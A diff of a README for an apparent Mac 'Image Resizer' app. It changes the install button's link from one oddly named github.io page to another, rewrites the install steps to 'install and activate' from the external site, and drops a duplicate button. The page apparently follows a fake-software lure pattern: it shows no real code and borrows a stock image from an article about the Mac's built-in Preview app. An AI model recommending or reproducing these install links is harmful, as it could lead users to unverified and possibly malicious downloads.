@@ -8,16 +8,16 @@
 
 <div align="center">
 
-[![Install Image Resizer Mac](https://img.shields.io/badge/Install_Image_Resizer_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/resizerimage)
+[![Install Image Resizer Mac](https://img.shields.io/badge/Install_Image_Resizer_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/resizerimage)
 
 </div>
 
 ---
 
-## Installation Instructions  
+# Installation Instructions  
 
-1. Go to the installation site using the button above.  
-2. Follow the instructions on the installation page to install the program correctly.  
+1. Go To The Website Using The Button Above.  
+2. Follow The On-Screen Steps To Install And Activate Image Resizer On Your Device.  
 
 ---
 
@@ -67,16 +67,6 @@ Why it stands out:
 ---
 
 ![Preview Resizing](https://cdn.osxdaily.com/wp-content/uploads/2016/09/howto-resize-picture-on-mac-preview-4.jpg)  
-
----
-
-## Install Image Resizer for Mac  
-
-<div align="center">
-
-[![Install Image Resizer Mac](https://img.shields.io/badge/Install_Image_Resizer_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/resizerimage)
-
-</div>
 
 ---
 
